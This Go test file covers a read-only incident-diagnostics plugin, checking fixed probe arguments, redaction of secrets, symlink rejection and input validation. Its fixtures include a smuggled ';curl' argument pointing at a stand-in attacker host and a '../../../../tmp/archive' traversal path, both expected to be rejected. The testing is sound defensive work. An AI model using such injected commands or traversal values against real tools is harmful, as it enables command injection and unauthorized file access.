package incident

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/ohtoe02/ohtools-plugins/internal/execx"
	"github.com/ohtoe02/ohtools-plugins/internal/protocol"
)

func TestDefinitionDeclaresApprovedReadOnlyCommands(t *testing.T) {
	t.Parallel()

	definition := NewDefinition(Options{Version: "1.0.0", Root: t.TempDir()})
	got := make([][]string, 0, len(definition.Manifest.Commands))
	for _, command := range definition.Manifest.Commands {
		got = append(got, command.Path)
		if command.Category != protocol.CategoryDiagnostic || command.RequiresRoot ||
			command.RequiresForce || command.RequiresConfirmation || command.SupportsDryRun {
			t.Fatalf("command has mutation requirements: %#v", command)
		}
	}
	want := [][]string{
		{"incident", "snapshot"},
		{"incident", "services"},
		{"incident", "timeline"},
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("command paths = %#v, want %#v", got, want)
	}
	timeline := definition.Manifest.Commands[2]
	if !reflect.DeepEqual(timeline.Flags, []protocol.Flag{{
		Name: "since", Type: "duration", Description: "Look back over local journal events",
		Default: "1h",
	}}) {
		t.Fatalf("timeline flags = %#v", timeline.Flags)
	}
	if err := protocol.ValidateManifest(definition.Manifest); err != nil {
		t.Fatalf("manifest is invalid: %v", err)
	}

	for _, path := range want {
		plan, err := definition.Plan(context.Background(), invocation(path...))
		if err != nil {
			t.Fatal(err)
		}
		if len(plan.Changes) != 0 || plan.RequiresRoot || plan.RequiresConfirmation {
			t.Fatalf("read-only plan can mutate: %#v", plan)
		}
	}
}

func TestSnapshotAggregatesBoundedLocalEvidenceWithFixedArgv(t *testing.T) {
	t.Setenv("HTTP_PROXY", "http://alice:proxy-secret@attacker.invalid")
	t.Setenv("INCIDENT_TOKEN", "caller-secret")

	root := t.TempDir()
	writeFixture(t, root, "etc/os-release",
		"ID=debian\nVERSION_ID=\"13\"\nPRETTY_NAME=\"Debian GNU/Linux 13\"\n")
	writeFixture(t, root, "proc/loadavg", "0.10 0.20 0.30 1/100 42\n")
	writeFixture(t, root, "proc/meminfo",
		"MemTotal: 4096 kB\nMemAvailable: 1024 kB\nSwapTotal: 512 kB\nSwapFree: 256 kB\n")

	var calls []execx.Spec
	runner := execx.RunnerFunc(func(_ context.Context, spec execx.Spec) (execx.Output, error) {
		calls = append(calls, spec)
		switch spec.Program {
		case "df":
			return execx.Output{Stdout: []byte(
				"Filesystem 1B-blocks Used Available Use% Mounted on\n/dev/sda1 1000 750 250 75% /\n",
			)}, nil
		case "ss":
			return execx.Output{Stdout: []byte(
				"tcp LISTEN 0 4096 127.0.0.1:22 0.0.0.0:*\n" +
					"udp UNCONN 0 0 0.0.0.0:53 0.0.0.0:*\n",
			)}, nil
		case "systemctl":
			return execx.Output{Stdout: []byte(
				"nginx.service loaded failed failed Password=unit-secret\n",
			)}, nil
		case "journalctl":
			return execx.Output{Stdout: []byte(
				"2026-07-27T12:00:00+00:00 host kernel[1]: Out of memory: Killed process 42 (alice) password=oom-secret\n" +
					"2026-07-27T12:01:00+00:00 host app[2]: API_KEY=journal-secret failed for user bob\n",
			)}, nil
		default:
			t.Fatalf("unexpected program %q", spec.Program)
			return execx.Output{}, nil
		}
	})
	now := time.Date(2026, 7, 27, 12, 5, 0, 0, time.UTC)
	definition := NewDefinition(Options{
		Version: "1.0.0", Root: root, Runner: runner,
		Host: "incident-host", Now: func() time.Time { return now },
	})
	result, err := definition.Execute(context.Background(), invocation("incident", "snapshot"))
	if err != nil {
		t.Fatal(err)
	}

	snapshot, ok := result.Data["snapshot"].(Snapshot)
	if !ok {
		t.Fatalf("snapshot = %#v", result.Data["snapshot"])
	}
	if snapshot.OS.ID != "debian" || snapshot.OS.Version != "13" ||
		!reflect.DeepEqual(snapshot.Load, []float64{0.1, 0.2, 0.3}) ||
		snapshot.Memory.TotalBytes != 4096*1024 ||
		snapshot.Memory.AvailableBytes != 1024*1024 ||
		snapshot.Disk.UsedPercent != 75 || snapshot.ListenerCount != 2 ||
		!reflect.DeepEqual(snapshot.FailedServices, []ServiceEvidence{{
			Unit: "nginx.service", Load: "loaded", Active: "failed", Sub: "failed",
		}}) ||
		snapshot.OOMEvents != 1 || snapshot.RecentErrors != 2 {
		t.Fatalf("snapshot evidence = %#v", snapshot)
	}

	wantCalls := []execx.Spec{
		{
			Program: "df", Arguments: []string{"-P", "-B1", "--", "/"},
			StdoutLimit: commandOutputLimit, StderrLimit: commandErrorLimit,
		},
		{
			Program: "ss", Arguments: []string{"-H", "-lntu"},
			StdoutLimit: commandOutputLimit, StderrLimit: commandErrorLimit,
		},
		{
			Program: "systemctl",
			Arguments: []string{
				"list-units", "--type=service", "--state=failed", "--all",
				"--no-legend", "--plain",
			},
			StdoutLimit: commandOutputLimit, StderrLimit: commandErrorLimit,
		},
		{
			Program: "journalctl",
			Arguments: []string{
				"--no-pager", "--output=short-iso", "--priority=0..3", "--since=-1h",
			},
			StdoutLimit: journalOutputLimit, StderrLimit: commandErrorLimit,
		},
	}
	if !reflect.DeepEqual(calls, wantCalls) {
		t.Fatalf("probe calls = %#v, want %#v", calls, wantCalls)
	}
	for _, call := range calls {
		if len(call.Environment) != 0 || len(call.Stdin) != 0 {
			t.Fatalf("probe inherited caller input: %#v", call)
		}
	}
	text := resultText(t, result)
	for _, forbidden := range []string{
		"proxy-secret", "caller-secret", "oom-secret", "journal-secret",
		"alice", "bob", "attacker.invalid", "Password=", "API_KEY",
	} {
		if strings.Contains(text, forbidden) {
			t.Fatalf("snapshot leaks %q: %s", forbidden, text)
		}
	}
}

func TestServicesReturnsOnlyNormalizedFailedUnits(t *testing.T) {
	t.Parallel()

	var calls []execx.Spec
	definition := NewDefinition(Options{
		Root: t.TempDir(),
		Runner: execx.RunnerFunc(func(_ context.Context, spec execx.Spec) (execx.Output, error) {
			calls = append(calls, spec)
			return execx.Output{Stdout: []byte(
				"zebra.service loaded failed failed user alice password=service-secret\n" +
					"alpha.service loaded failed failed another description\n",
			)}, nil
		}),
	})
	result, err := definition.Execute(context.Background(), invocation("incident", "services"))
	if err != nil {
		t.Fatal(err)
	}
	services, ok := result.Data["failed_services"].([]ServiceEvidence)
	if !ok || !reflect.DeepEqual(services, []ServiceEvidence{
		{Unit: "alpha.service", Load: "loaded", Active: "failed", Sub: "failed"},
		{Unit: "zebra.service", Load: "loaded", Active: "failed", Sub: "failed"},
	}) {
		t.Fatalf("failed services = %#v", result.Data["failed_services"])
	}
	want := []execx.Spec{{
		Program: "systemctl", Arguments: failedUnitArguments(),
		StdoutLimit: commandOutputLimit, StderrLimit: commandErrorLimit,
	}}
	if !reflect.DeepEqual(calls, want) {
		t.Fatalf("probe calls = %#v, want %#v", calls, want)
	}
	text := resultText(t, result)
	for _, forbidden := range []string{"alice", "service-secret", "description"} {
		if strings.Contains(text, forbidden) {
			t.Fatalf("services leaks %q: %s", forbidden, text)
		}
	}
}

func TestTimelineUsesBoundedDurationAndFixedJournalPriority(t *testing.T) {
	t.Parallel()

	var calls []execx.Spec
	definition := NewDefinition(Options{
		Root: t.TempDir(),
		Runner: execx.RunnerFunc(func(_ context.Context, spec execx.Spec) (execx.Output, error) {
			calls = append(calls, spec)
			return execx.Output{Stdout: []byte(
				"2026-07-27T12:00:00+00:00 host kernel[1]: Out of memory: user alice password=secret\n" +
					"2026-07-27T12:01:00+00:00 host systemd[1]: Failed to start api-token-secret.service\n" +
					"2026-07-27T12:02:00+00:00 host sshd[2]: authentication failure for bob\n",
			)}, nil
		}),
	})
	request := invocation("incident", "timeline")
	request.Options["since"] = "30m"
	result, err := definition.Execute(context.Background(), request)
	if err != nil {
		t.Fatal(err)
	}
	timeline, ok := result.Data["timeline"].(Timeline)
	if !ok || timeline.Since != "30m0s" || !reflect.DeepEqual(timeline.Events, []TimelineEvent{
		{Timestamp: "2026-07-27T12:00:00+00:00", Category: "out-of-memory"},
		{Timestamp: "2026-07-27T12:01:00+00:00", Category: "service-failure"},
		{Timestamp: "2026-07-27T12:02:00+00:00", Category: "authentication"},
	}) {
		t.Fatalf("timeline = %#v", result.Data["timeline"])
	}
	want := []execx.Spec{{
		Program: "journalctl",
		Arguments: []string{
			"--no-pager", "--output=short-iso", "--priority=0..3", "--since=-30m0s",
		},
		StdoutLimit: journalOutputLimit, StderrLimit: commandErrorLimit,
	}}
	if !reflect.DeepEqual(calls, want) {
		t.Fatalf("journal call = %#v, want %#v", calls, want)
	}
	text := resultText(t, result)
	for _, forbidden := range []string{
		"alice", "bob", "secret", "api-token", "password", "authentication failure",
	} {
		if strings.Contains(text, forbidden) {
			t.Fatalf("timeline leaks %q: %s", forbidden, text)
		}
	}
}

func TestTimelineAcceptsActualJournalShortISOTimestamp(t *testing.T) {
	t.Parallel()

	events, err := parseTimeline(
		"2026-07-27T12:34:56+0500 host kernel[1]: critical kernel event\n",
	)
	if err != nil {
		t.Fatalf("parseTimeline returned %v", err)
	}
	want := []TimelineEvent{{
		Timestamp: "2026-07-27T12:34:56+0500",
		Category:  "kernel",
	}}
	if !reflect.DeepEqual(events, want) {
		t.Fatalf("events = %#v, want %#v", events, want)
	}
}

func TestTimelineRejectsNonPositiveAndOversizedDurationsBeforeProbe(t *testing.T) {
	t.Parallel()

	called := false
	definition := NewDefinition(Options{
		Root: t.TempDir(),
		Runner: execx.RunnerFunc(func(context.Context, execx.Spec) (execx.Output, error) {
			called = true
			return execx.Output{}, nil
		}),
	})
	for _, since := range []string{"0s", "-1s", "168h1s"} {
		request := invocation("incident", "timeline")
		request.Options["since"] = since
		if _, err := definition.Plan(context.Background(), request); exitCode(err) != protocol.ExitArguments {
			t.Fatalf("Plan since=%q error = %v, want exit %d", since, err, protocol.ExitArguments)
		}
		if _, err := definition.Execute(context.Background(), request); exitCode(err) != protocol.ExitArguments {
			t.Fatalf("Execute since=%q error = %v, want exit %d", since, err, protocol.ExitArguments)
		}
	}
	if called {
		t.Fatal("journal probe ran for invalid duration")
	}
}

func TestSnapshotKeepsUsableEvidenceWhenOptionalProbesAreMissing(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	writeFixture(t, root, "etc/os-release", "ID=ubuntu\nVERSION_ID=\"24.04\"\n")
	writeFixture(t, root, "proc/loadavg", "1.00 2.00 3.00 1/10 9\n")
	writeFixture(t, root, "proc/meminfo",
		"MemTotal: 2048 kB\nMemAvailable: 1024 kB\nSwapTotal: 0 kB\nSwapFree: 0 kB\n")
	definition := NewDefinition(Options{
		Root: root,
		Runner: execx.RunnerFunc(func(_ context.Context, spec execx.Spec) (execx.Output, error) {
			switch spec.Program {
			case "df":
				return execx.Output{Stdout: []byte(
					"Filesystem 1B-blocks Used Available Use% Mounted on\n/dev/sda 200 50 150 25% /\n",
				)}, nil
			case "systemctl":
				return execx.Output{Stdout: []byte(
					"api.service loaded failed failed hidden description\n",
				)}, nil
			default:
				return execx.Output{Stderr: []byte("password=probe-secret")}, execx.ErrNotFound
			}
		}),
	})
	result, err := definition.Execute(context.Background(), invocation("incident", "snapshot"))
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != protocol.StatusPartial ||
		!hasErrorCode(result, "listeners") || !hasErrorCode(result, "journal") {
		t.Fatalf("result = %#v, want partial listener and journal evidence", result)
	}
	snapshot := result.Data["snapshot"].(Snapshot)
	if snapshot.OS.ID != "ubuntu" || snapshot.Disk.UsedPercent != 25 ||
		len(snapshot.FailedServices) != 1 || snapshot.FailedServices[0].Unit != "api.service" {
		t.Fatalf("usable evidence was suppressed: %#v", snapshot)
	}
	if strings.Contains(resultText(t, result), "probe-secret") {
		t.Fatalf("probe failure leaked stderr: %s", resultText(t, result))
	}
}

func TestSnapshotRejectsSymlinkedAndOversizedKernelEvidence(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	outside := filepath.Join(t.TempDir(), "outside-release")
	if err := os.WriteFile(outside, []byte("ID=secret-os\nVERSION_ID=secret-version\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(root, "etc")
	if err := os.MkdirAll(path, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(path, "os-release")); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}
	writeFixture(t, root, "proc/loadavg", strings.Repeat("1", int(fileInputLimit+1)))
	writeFixture(t, root, "proc/meminfo", "MemTotal: 1 kB\nMemAvailable: 1 kB\n")
	definition := NewDefinition(Options{
		Root: root,
		Runner: execx.RunnerFunc(func(_ context.Context, spec execx.Spec) (execx.Output, error) {
			return execx.Output{}, execx.ErrNotFound
		}),
	})
	result, err := definition.Execute(context.Background(), invocation("incident", "snapshot"))
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != protocol.StatusPartial ||
		!hasErrorCode(result, "os") || !hasErrorCode(result, "load") {
		t.Fatalf("result = %#v, want partial unsafe kernel evidence", result)
	}
	text := resultText(t, result)
	for _, forbidden := range []string{"secret-os", "secret-version"} {
		if strings.Contains(text, forbidden) {
			t.Fatalf("snapshot followed symlink and leaked %q: %s", forbidden, text)
		}
	}
}

func TestCommandsRejectUntrustedInputBeforeProbe(t *testing.T) {
	t.Parallel()

	called := false
	definition := NewDefinition(Options{
		Root: t.TempDir(),
		Runner: execx.RunnerFunc(func(context.Context, execx.Spec) (execx.Output, error) {
			called = true
			return execx.Output{}, nil
		}),
	})
	for _, path := range [][]string{
		{"incident", "snapshot"}, {"incident", "services"}, {"incident", "timeline"},
	} {
		request := invocation(path...)
		request.Arguments = []string{";curl", "https://alice:secret@attacker.invalid"}
		if _, err := definition.Execute(context.Background(), request); exitCode(err) != protocol.ExitArguments {
			t.Fatalf("%v arguments error = %v", path, err)
		}
		request = invocation(path...)
		request.Options["output"] = "../../../../tmp/archive"
		if _, err := definition.Execute(context.Background(), request); exitCode(err) != protocol.ExitArguments {
			t.Fatalf("%v options error = %v", path, err)
		}
	}
	if called {
		t.Fatal("probe ran for rejected caller input")
	}
}

func TestMalformedAndTruncatedExternalEvidenceIsPartialAndSanitized(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		path   []string
		output execx.Output
		code   string
	}{
		{
			name: "services malformed", path: []string{"incident", "services"},
			output: execx.Output{Stdout: []byte("not-a-unit password=malformed-secret\n")},
			code:   "services",
		},
		{
			name: "services truncated", path: []string{"incident", "services"},
			output: execx.Output{
				Stdout:          []byte("api.service loaded failed failed\n"),
				StdoutTruncated: true, Stderr: []byte("token=truncated-secret"),
			},
			code: "services",
		},
		{
			name: "timeline malformed", path: []string{"incident", "timeline"},
			output: execx.Output{Stdout: []byte("not-a-timestamp user alice password=journal-secret\n")},
			code:   "timeline",
		},
	}
	for _, test := range tests {
		test := test
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			definition := NewDefinition(Options{
				Root: t.TempDir(),
				Runner: execx.RunnerFunc(func(context.Context, execx.Spec) (execx.Output, error) {
					return test.output, nil
				}),
			})
			result, err := definition.Execute(context.Background(), invocation(test.path...))
			if err != nil {
				t.Fatal(err)
			}
			if result.Status != protocol.StatusPartial || !hasErrorCode(result, test.code) {
				t.Fatalf("result = %#v, want partial %s", result, test.code)
			}
			text := resultText(t, result)
			for _, forbidden := range []string{
				"malformed-secret", "truncated-secret", "journal-secret", "alice",
			} {
				if strings.Contains(text, forbidden) {
					t.Fatalf("result leaks %q: %s", forbidden, text)
				}
			}
		})
	}
}

func TestCancellationStopsBeforeAnyProbe(t *testing.T) {
	t.Parallel()

	called := false
	definition := NewDefinition(Options{
		Root: t.TempDir(),
		Runner: execx.RunnerFunc(func(context.Context, execx.Spec) (execx.Output, error) {
			called = true
			return execx.Output{}, nil
		}),
	})
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	for _, path := range [][]string{
		{"incident", "snapshot"}, {"incident", "services"}, {"incident", "timeline"},
	} {
		if _, err := definition.Execute(ctx, invocation(path...)); !errors.Is(err, context.Canceled) {
			t.Fatalf("%v error = %v, want cancellation", path, err)
		}
	}
	if called {
		t.Fatal("probe ran after cancellation")
	}
}

func TestSnapshotIsDeterministic(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	writeFixture(t, root, "etc/os-release", "ID=debian\nVERSION_ID=13\n")
	writeFixture(t, root, "proc/loadavg", "0.1 0.2 0.3 1/1 1\n")
	writeFixture(t, root, "proc/meminfo", "MemTotal: 2 kB\nMemAvailable: 1 kB\n")
	runner := execx.RunnerFunc(func(_ context.Context, spec execx.Spec) (execx.Output, error) {
		switch spec.Program {
		case "df":
			return execx.Output{Stdout: []byte(
				"Filesystem 1B-blocks Used Available Use% Mounted on\n/dev/sda 10 5 5 50% /\n",
			)}, nil
		case "systemctl":
			return execx.Output{Stdout: []byte(
				"z.service loaded failed failed z\n" +
					"a.service loaded failed failed a\n",
			)}, nil
		default:
			return execx.Output{}, nil
		}
	})
	now := time.Date(2026, 7, 27, 15, 0, 0, 0, time.UTC)
	definition := NewDefinition(Options{
		Root: root, Runner: runner, Host: "stable-host", Now: func() time.Time { return now },
	})
	first, err := definition.Execute(context.Background(), invocation("incident", "snapshot"))
	if err != nil {
		t.Fatal(err)
	}
	second, err := definition.Execute(context.Background(), invocation("incident", "snapshot"))
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(first, second) {
		t.Fatalf("snapshot is not deterministic:\nfirst=%#v\nsecond=%#v", first, second)
	}
}

func TestKernelParsersRejectNonFiniteAndUntrustedValues(t *testing.T) {
	t.Parallel()

	for _, value := range []string{"NaN 0 0 1/1 1", "+Inf 0 0 1/1 1"} {
		if _, err := parseLoad(value); err == nil {
			t.Fatalf("parseLoad(%q) succeeded", value)
		}
	}
	if _, err := parseOSRelease(
		"ID=alice\nVERSION_ID=password=kernel-secret\nPRETTY_NAME=secret-user\n",
	); err == nil {
		t.Fatal("untrusted os-release identifiers were accepted")
	}
	if _, err := parseMemory(
		"MemTotal: 18446744073709551615 kB\nMemAvailable: 1 kB\n",
	); err == nil {
		t.Fatal("overflowing memory value was accepted")
	}
}

func invocation(path ...string) protocol.Invocation {
	return protocol.Invocation{
		ProtocolVersion: protocol.ProtocolVersion,
		RequestID:       "incident-test",
		CommandPath:     path,
		Arguments:       []string{},
		Options:         map[string]any{},
	}
}

func hasErrorCode(result protocol.Result, code string) bool {
	for _, issue := range result.Errors {
		if issue.Code == code {
			return true
		}
	}
	return false
}

func exitCode(err error) int {
	var failure protocol.ExitError
	if errors.As(err, &failure) {
		return failure.Code
	}
	return -1
}

func writeFixture(t *testing.T, root, relative, content string) {
	t.Helper()
	path := filepath.Join(root, filepath.FromSlash(relative))
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func resultText(t *testing.T, result protocol.Result) string {
	t.Helper()
	encoded, err := json.Marshal(result)
	if err != nil {
		t.Fatal(err)
	}
	return string(encoded)
}
